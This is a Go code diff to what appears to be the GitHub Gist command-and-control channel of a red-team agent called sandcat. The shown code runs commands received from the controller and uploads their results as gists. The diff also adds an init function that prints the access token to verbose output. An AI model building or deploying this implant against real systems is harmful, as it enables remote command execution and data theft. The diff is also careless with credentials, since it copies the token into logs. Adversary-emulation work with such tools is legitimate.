@@ -29,6 +29,10 @@ var (
 //GIST communicate over github gists
 type GIST struct {}
 
+func init() {
+	output.VerbosePrint("Token: " + token)
+}
+
 //Ping tests connectivity to the server
 func (contact GIST) Ping(server string) bool {
 	ctx := context.Background()
@@ -76,6 +80,15 @@ func (contact GIST) DropPayloads(payload string, server string, uniqueId string)
 func (contact GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string))
 	gistResults(profile["paw"].(string), command["id"], result, status, cmd, pid)
+}
+
+//C2RequirementsMet determines if sandcat can use the selected comm channel
+func (contact GIST) C2RequirementsMet(criteria interface{}) bool {
+	if len(criteria.(string)) > 0 {
+		token = criteria.(string)
+		return true
+	}
+	return false
 }
 
 func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
@@ -138,7 +151,6 @@ func createGist(gistType string, uniqueId string, data []byte) int {
 	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
 	_, resp, err := c2Client.Gists.Create(ctx, &gist)
 	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("%s", err))
 		return githubError
 	}
 	return resp.StatusCode
